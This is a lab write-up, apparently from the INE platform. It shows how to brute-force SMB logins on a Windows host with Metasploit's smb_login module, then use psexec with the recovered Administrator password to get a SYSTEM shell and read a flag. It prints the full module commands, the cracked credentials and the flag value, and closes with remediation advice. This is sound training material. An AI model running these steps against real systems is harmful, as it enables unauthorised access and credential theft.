---
title: "Windows: SMB Server PsExec"
description: "Brute-forcing SMB credentials with Metasploit's smb_login module and using the recovered Administrator password with the psexec module to get a SYSTEM Meterpreter session and read the flag."
date: 2025-11-03
platform: "INE Labs"
difficulty: "Easy"
tags: ["SMB", "smb_login", "PsExec", "Metasploit", "Brute Force", "Windows"]
cover: "./photo6.png"
---

# Windows: SMB Server PsExec

**Classification:** Host & Network Penetration Testing / System & Host-Based Attacks<br>
**Target:** 10.2.28.253 — Windows (SMB)<br>
**Flag:** `e0da81a9cd42b261bc9b90d15f780433`

## 1. Executive Summary

The target exposes SMB. We brute-force credentials with the `smb_login` module (recovering
four accounts, including Administrator), then use `psexec` with the admin password to execute
a payload and obtain a `NT AUTHORITY\SYSTEM` Meterpreter session. The flag is in `C:\`.

## 2. Recon

```bash
ping -c 4 10.2.28.253
nmap -sV 10.2.28.253
```

![Ping target](./photo1.png)

![nmap — SMB open](./photo2.png)

## 3. SMB Credential Brute-Force

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.2.28.253
set RPORT 445
set VERBOSE true
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

![Starting MSF Console](./photo3.png)

![Selecting smb_login](./photo4.png)

![smb_login options](./photo5.png)

Four valid credential pairs (one Administrator):

```
sysadmin:samantha | demo:victoria | auditor:elizabeth | administrator:qwertyuiop
```

![smb_login — 4 credentials](./photo6.png)

## 4. Exploitation (psexec → SYSTEM)

```bash
use exploit/windows/smb/psexec
set RHOSTS 10.2.28.253
set SMBUser administrator
set SMBPass qwertyuiop
exploit
```

![psexec configured](./photo7.png)

![psexec — SYSTEM session](./photo8.png)

## 5. Capturing the Flag

```bash
cd C:\
dir
cat flag.txt
# e0da81a9cd42b261bc9b90d15f780433
```

![Flag from C:\flag.txt](./photo9.png)

## 6. Remediation Recommendations

1. **Enforce strong passwords & lockout** — all four accounts fell to small wordlists.
2. **Restrict SMB admin access** (`C$`/service creation) and apply least privilege; use LAPS
   for unique local admin passwords.
3. **Require SMB signing** and disable SMBv1.
4. **Monitor** for `psexec`-style service creation and failed SMB logon spikes.
